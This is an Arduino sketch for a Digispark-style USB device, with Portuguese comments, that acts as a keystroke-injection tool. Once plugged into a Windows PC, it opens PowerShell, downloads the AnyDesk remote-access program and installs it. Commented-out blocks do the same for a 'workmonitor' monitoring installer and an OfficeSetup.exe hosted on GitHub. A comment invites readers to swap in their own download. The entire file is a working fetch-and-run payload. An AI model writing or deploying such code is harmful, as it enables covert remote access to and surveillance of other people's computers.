#define kbd_pt_br
#include "DigiKeyboard.h"

void setup() {
  // Código de configuração vazio
}

void loop() {
  // Envia uma tecla "Shift + R" para abrir o menu de execução (Windows + R)
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Digita "powershell" na caixa de execução e pressiona Enter
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Envia o comando para baixar e executar um arquivo, mas aqui você pode modificar para o seu uso
  /*DigiKeyboard.print("Start-BitsTransfer -Source \"http://workmonitor.com/install/install.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\spa-install.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);

  DigiKeyboard.print("Start-BitsTransfer -Source \"https://github.com/YuriGomes4/arduino/raw/refs/heads/main/Resources/OfficeSetup.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\office-install.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);*/

  DigiKeyboard.print("Start-BitsTransfer -Source \"https://download.anydesk.com/AnyDesk.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\anydesk-install.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);

  // Executa o arquivo baixado
  /*DigiKeyboard.print(".\\Downloads\\spa-install.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);

  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT);
  DigiKeyboard.delay(800);

  DigiKeyboard.print(".\\Downloads\\office-install.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);

  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(5000);*/

  /*DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT);
  DigiKeyboard.delay(800);*/

  DigiKeyboard.print(".\\Downloads\\anydesk-install.exe --install");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);

  //DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Laço infinito para não continuar o loop
  for(;;){
    // Loop vazio
  }
}